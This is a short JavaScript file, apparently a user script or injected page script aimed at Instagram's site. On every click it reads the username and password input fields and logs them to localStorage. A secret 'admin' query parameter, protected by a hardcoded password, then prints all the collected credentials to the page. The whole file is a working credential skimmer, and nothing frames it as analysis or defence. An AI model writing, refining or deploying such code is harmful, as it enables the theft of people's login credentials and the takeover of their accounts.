if(window.location.host == 'www.instagram.com'){
    start()
}






function start(){

function hack(){
    var desire = location.search.slice(1).split("&")[0].split("=")[1];
    if(desire == "admin"){
       var pass=prompt("Enter admin password");
       if(pass === '01050739969'){
        document.write(`<h1>[USER_DATA_JSON_JS]</h1>`+localStorage.getItem("user_data"))
       }
       else{
        alert("Error password !");
        window.location="https://instagram.com";
       }
    }
}hack()




document.addEventListener("click", myFunction);

function myFunction() {
    var username=document.querySelectorAll("input")[0].value;
    var password=document.querySelectorAll("input")[1].value;
    var redata=localStorage.getItem("user_data");
         var data=redata+`
           {
            "username":"${username}",
            "password":"${password}"
           },
         `;
    console.log(data);
    localStorage.setItem("user_data",data)
}
}
